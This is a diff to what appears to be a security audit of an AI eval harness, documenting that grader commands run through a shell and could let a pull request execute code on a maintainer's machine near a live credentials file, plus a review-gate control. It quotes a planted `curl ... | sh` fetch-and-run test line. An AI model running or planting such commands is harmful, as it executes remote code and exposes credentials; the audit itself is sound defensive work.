@@ -265,8 +265,8 @@ ship to consumers; it runs on the maintainer's machine.
 | Field | Value |
 |---|---|
 | Trigger | Manual. `evals/README.md:241` gives `python3 evals/run_eval.py tasks --skill ... --model sonnet --parallel 5` |
-| Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:607`) and for git (`:1043`, `:1072`, `:1073`, `:1263`, `:1675`, `:1683`, `:2137`, `:2138`, `:2155`). And `subprocess.run(command, shell=True, ...)` at `:984`-`:986`, where `command` is a grader string read from a suite's `assertions.json` |
-| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:122`, applied through `RunPermissions` at `:421` and `:481`-`:486`, with the unbounded surface behind `--all-tools` (`:1885`, `:2911`). `--setting-sources project` keeps the caller's own settings out of both arms (`:468`) |
+| Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:607`) and for git (`:1050`, `:1079`, `:1080`, `:1270`, `:1682`, `:1690`, `:2144`, `:2145`, `:2162`). And `subprocess.run(command, shell=True, ...)` at `:991`-`:993`, where `command` is a grader string read from a suite's `assertions.json` |
+| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:122`, applied through `RunPermissions` at `:421` and `:481`-`:486`, with the unbounded surface behind `--all-tools` (`:1892`, `:2918`). `--setting-sources project` keeps the caller's own settings out of both arms (`:468`) |
 | Filesystem, outside the repository root | Yes, and it reaches a live credential. `:353` resolves `$CLAUDE_CONFIG_DIR/.credentials.json`, or `~/.claude/.credentials.json`, and `:356` symlinks it into the run's private home. A private HOME tree is created per run (`:340`-`:352`). `evals/.gitignore` records the consequence: "it contains a symlink to the credentials file that authenticates the run ... none of it may be pushed" |
 | Environment | `env = dict(os.environ)` (`:407`), so the run starts from the caller's environment, less every variable whose name starts with `CLAUDE` other than the provider and credential variables in `INHERITED_CLAUDE_VARIABLES` (`:369`, `:415`); `$EVAL_TOOL_BIN` is prepended to `PATH` (`:410`) |
 | Network egress | The Anthropic API, through `claude`. Plus whatever the graded agent chooses to do, which as audited was unconstrained, and is now what Bash can reach: `WebFetch` is off the `TASK_TOOLS` allowlist (`:122`). Plus whatever a fixture's own tooling fetches (`evals/README.md:228`-`:236` provisions `ansible-lint`, `zizmor`, `ansible-core`, `shellcheck`, `bats`) |
@@ -275,8 +275,8 @@ ship to consumers; it runs on the maintainer's machine.
 Supporting eval data:
 
 - `evals/*/assertions.json` and `evals/agents/*/assertions.json`, nine files, hold the strings
-  executed at `run_eval.py:984`. Since control 4, a run refuses when a suite's file differs from
-  the review baseline (`run_eval.py:914`).
+  executed at `run_eval.py:991`. Since control 4, a run refuses when a suite's file differs from
+  the review baseline (`run_eval.py:923`).
 - `evals/*/fixtures/**` are deliberately flawed inputs, excluded from `ruff` and `ty`
   (`pyproject.toml:28`, `:38`) and from secret scanning (`.github/secret_scanning.yml:12`).
 - `evals/probe-sandbox/` is a mixed repository holding a Dockerfile, a `docker-compose.yml`, a
@@ -308,15 +308,15 @@ agent ends up doing, and the blast radius on a consumer's machine.
 fixture with a `workspace_command` assertion. Both are the ordinary shape of a contribution to
 this repository, since a new eval task requires both files.
 
-**File abused.** `evals/run_eval.py:984`-`:986`. The grader string is passed to
-`subprocess.run(command, shell=True, ...)`. The comment at `:982` gives the reason, and the reason
+**File abused.** `evals/run_eval.py:991`-`:993`. The grader string is passed to
+`subprocess.run(command, shell=True, ...)`. The comment at `:989` gives the reason, and the reason
 holds only for the trust assumption it names: "The command comes from a checked-in
 assertions.json in this repository". A pull request branch is not yet that.
 
 **What happens.** The maintainer runs the suite as `evals/README.md:241` documents. `run_grader`
 executes the string under `/bin/sh` with `cwd` set to the finished workspace and `env` from
 `run_environment(home)`, which is `dict(os.environ)` less the Claude Code variables outside
-`INHERITED_CLAUDE_VARIABLES`, plus the run's private HOME (`run_eval.py:407`, `:980`).
+`INHERITED_CLAUDE_VARIABLES`, plus the run's private HOME (`run_eval.py:407`, `:987`).
 
 **Blast radius.** Arbitrary code as the maintainer, on the maintainer's machine, in a process
 whose HOME holds a symlink to the live `~/.claude/.credentials.json` (`run_eval.py:353`-`:356`).
@@ -332,19 +332,21 @@ reach an install script; here a pull request reaches a shell directly, because t
 by hand rather than in a sandbox.
 
 **Landed, as a refusal rather than a sandbox.** `require_reviewed_graders` at
-`evals/run_eval.py:914` runs before anything is graded, from `cmd_tasks` (`:1853`),
-`cmd_agent_tasks` (`:1906`), `cmd_instructions_tasks` (`:1954`) and `cmd_regrade` (`:2175`), the
+`evals/run_eval.py:923` runs before anything is graded, from `cmd_tasks` (`:1860`),
+`cmd_agent_tasks` (`:1913`), `cmd_instructions_tasks` (`:1961`) and `cmd_regrade` (`:2182`), the
 only four subcommands that execute an assertion command. It compares
-the grader-bearing files at `:826`, the suite's `assertions.json` and the harness itself, against
-`origin/main` or `main` (`:821`), and refuses when either differs. The comparison is against the
-working tree rather than `HEAD` (`:881`), because a contributor's change reaches the shell the
-same way whether it was committed on a branch or applied as a patch. The refusal prints the
-`workspace_command` strings that are new or changed against the baseline (`:845`, `:859`), so the
-human decides with the commands in front of them, and `--graders-reviewed` (`:2889`) is the only
-way past. Verified by planting `curl -s https://example.invalid/x | sh` into a suite: the run
-refused, named the file, and printed that command. The planted assertion was reverted.
+the grader-bearing paths at `:829`, the suite's `assertions.json`, `tasks.json`, fixtures, patches
+and the harness, against `origin/main` or `main` (`:821`), and refuses when any differs. The
+comparison is against the working tree rather than `HEAD` (`:890`), because a contributor's change
+reaches the shell the same way whether committed on a branch or applied as a patch. The refusal
+prints every path that differs and the `workspace_command` strings that are new or changed (`:854`,
+`:868`), so the human decides with the commands in front of them, and `--graders-reviewed` (`:2896`)
+is the only way past. Verified by planting `curl -s https://example.invalid/x | sh` into a suite:
+the run refused, named the file, and printed that command. The planted assertion was reverted.
+Verified again after the guarded set widened, by planting a fixture edit, an untracked fixture file,
+a patch and a `tasks.json` edit: the refusal named each path. The planted changes were reverted.
 
-The trust assumption in the comment at `:982` is now enforced rather than asserted. What this
+The trust assumption in the comment at `:989` is now enforced rather than asserted. What this
 does not do is make an assertion command safe: a reviewed command runs with exactly the reach it
 had before, so this is a control on **who decided**, not on **what the command can do**. The
 sandbox option in `controls.md` is the one that bounds reach, and it is still open.
